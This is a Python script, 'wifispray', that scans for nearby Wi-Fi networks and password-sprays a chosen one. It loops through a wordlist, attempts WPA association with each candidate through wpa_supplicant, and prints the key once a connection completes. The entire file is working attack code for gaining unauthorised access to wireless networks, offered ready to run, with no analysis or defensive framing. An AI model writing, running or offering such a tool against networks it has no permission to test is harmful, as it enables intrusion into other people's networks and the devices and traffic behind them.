from wpa_supplicant.core import WpaSupplicantDriver
from wpa_supplicant.core import Network
from wpa_supplicant.core import BSS
from twisted.internet.selectreactor import SelectReactor
import threading
import time
import sys

class color:
	R = '\033[91m'
	Y = '\033[93m'
	B = '\033[94m'
	E = '\033[0m'
	C = '\033[96m'
	P = '\033[95m'
	
class wifispray:
	def __init__(self):
		# Start a simple Twisted SelectReactor
		self.ssid_list = []
		self.bssid_list = []
		self.key_mgmt_list = []
		self.pairwise_list = []
		self.net_cfg  = {}
		self.reactor = SelectReactor()
		self.thread1 = threading.Thread(target=self.reactor.run, kwargs={'installSignalHandlers': 0})
		self.thread1.setDaemon(True)
		self.thread1.start()
		time.sleep(0.1)
		self.f = open('pass.txt',encoding='utf-8')
		self.passwords=self.f.readlines()
		
		# Start Driver
		self.driver = WpaSupplicantDriver(self.reactor)

		# Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
		self.supplicant = self.driver.connect()

		try:
			self.interface = str(self.supplicant.get_interface('wlan0'))
			self.interface = self.supplicant.remove_interface(self.interface.split(',')[0][16:])	
		except:
			pass
		self.interface = self.supplicant.create_interface('wlan0')
		self.scn()
		self.spray()
		
	def im_out(self):
		self.f.close()
		self.thread1.join(1)
		sys.exit()
			
	def scn(self):
		#Issue the scan
		print("Now Scanning...")
		scan_results = self.interface.scan(block=True)
		#print(scan_results)
		print(color.C+"========"+color.Y+"SSID"+color.C+"========"+color.E)
		count=1
		for bss in scan_results:
			self.ssid_list.append(bss.get_ssid())
			self.bssid_list.append(bss.get_bssid())
			rsn = bss.get_rsn()
			if len(rsn['Pairwise'])==0:
				key=color.Y+"empty"+color.E
				pass
			else:
				self.pairwise_list.append(rsn['Pairwise'][0])
				self.key_mgmt_list.append(rsn['KeyMgmt'][0])
				key=rsn['KeyMgmt'][0]
			print(color.C+"{}) ".format(count)+color.E+"{} ".format(bss.get_ssid())+color.R+"({})".format(key)+color.E)
			count+=1
		print(color.C+"===================="+color.E)
		
	def spray(self):
		indx=int(input("Which SSID do you want to password-spray? "))-1
		print("Password-spraying "+color.R+"{}:".format(self.ssid_list[indx])+color.E)
		self.net_cfg["mode"] = 0
		self.net_cfg['ssid'] = self.ssid_list[indx]
		self.net_cfg['key_mgmt'] = self.key_mgmt_list[indx].upper()
		for i in self.passwords:
			j=i.strip('\n')
			if len(j) >= 8:
				self.net_cfg['psk'] = j
				print(color.C+"Trying --> "+color.E+"{}".format(j))
				add_net=self.interface.add_network(self.net_cfg)
				self.interface.select_network(add_net.get_path())
				time.sleep(.2)
				state = self.interface.get_state()
				print(state)
				loop=0
				while (state == "scanning" or state == "authenticating" or state == "associating" or state == "associated" or state == "disconnected"):
					time.sleep(.2)
					state = self.interface.get_state()
					loop+=1
					#print(state)
					if state == "4way_handshake":
						time.sleep(.3)
						state = self.interface.get_state()
						print(state)
					if loop > 10:
						break				
					
				if state == "completed":
					print(color.B+state+color.E)
					print(color.Y+"\n+++"+color.E+"The Password for "+color.R+"{}".format(self.net_cfg['ssid'])+color.E+" is "+color.E+"\"\"\""+color.R+"{}".format(self.net_cfg['psk'])+color.E+"\"\"\""+color.Y+"+++\n"+color.E)
					self.interface.disconnect_network()
					self.im_out()
		interface.disconnect_network()
		self.im_out()
			
z=wifispray()
